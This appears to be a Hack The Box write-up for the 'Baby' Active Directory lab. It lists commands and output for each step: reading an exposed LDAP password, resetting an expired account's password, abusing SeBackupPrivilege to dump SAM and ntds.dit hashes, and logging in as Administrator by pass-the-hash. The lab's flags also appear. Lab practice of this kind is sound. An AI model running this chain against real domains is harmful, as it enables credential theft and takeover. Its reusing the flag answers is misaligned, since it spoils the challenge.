# Hack The Box - Easy - Baby



## What is the fully qualified domain name on Baby?

- Answer: BabyDC.baby.vl

## Which user has an exposed password in their LDAP description field?

- Command: netexec ldap 10.129.34.60 --users

- Credentials: Teresa.Bell : BabyStart123!

- Answer: Teresa.Bell

## Which user account must have its expired password reset before logging in?

- Command: netexec ldap 10.129.34.60 -u '' -p '' --query "(objectClass=*)" sAMAccountName

- Answer: Caroline.Robinson

## User Flag

- Command: netexec smb 10.129.34.60 -u Caroline.Robinson -p 'BabyStart123!' -M change-password -o NEWPASS='ResetPassword2026!'

- Credentials: Caroline.Robinson : ResetPassword2026!

- Command: netexec smb 10.129.34.60 -u Caroline.Robinson -p 'ResetPassword2026!' --shares

- Command: evil-winrm -i 10.129.34.60 -u Caroline.Robinson -p 'ResetPassword2026!'

- Answer: dd9fe1793dd25ee9ac44538cd7c4ace2

## What dangerous privilege does the Caroline.Robinson user have associated with their account?

- Command: whoami /priv

- Output:

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeBackupPrivilege             Back up files and directories  Enabled
SeRestorePrivilege            Restore files and directories  Enabled
SeShutdownPrivilege           Shut down the system           Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled


- Answer: SeBackupPrivilege

## Which file contains encrypted user domain hashes?

- Answer: ntds.dit

## What is the Administrator user's domain hash?

- Command: netexec smb 10.129.34.60 -u Caroline.Robinson -p 'ResetPassword2026!' -M backup_operator

- Command: smbclient //10.129.34.60/SYSVOL -U 'baby.vl\Caroline.Robinson%ResetPassword2026!'

- Command: get SAM

- Command: get SYSTEM

- Command: impacket-secretsdump -sam SAM -system SYSTEM local

Administrator:500:aad3b435b51404eeaad3b435b51404ee:8d992faed38128ae85e95fa35868bb43:::

Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::

DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::

- Command: mkdir C:\Users\Caroline.Robinson\Documents\NTDS

- Command: esentutl /y /v "C:\Windows\NTDS\ntds.dit" /d "C:\Users\Caroline.Robinson\Documents\NTDS\ntds.dit"


- Answer: ee4457ae59f1e3fbd764e33d9cef123d


## Root Flag

- Command: evil-winrm-py -i BABYDC.baby.vl -u Administrator -H ee4457ae59f1e3fbd764e33d9cef123d

- Answer: 9644cbf2b8fb349ce894225b8502bf0a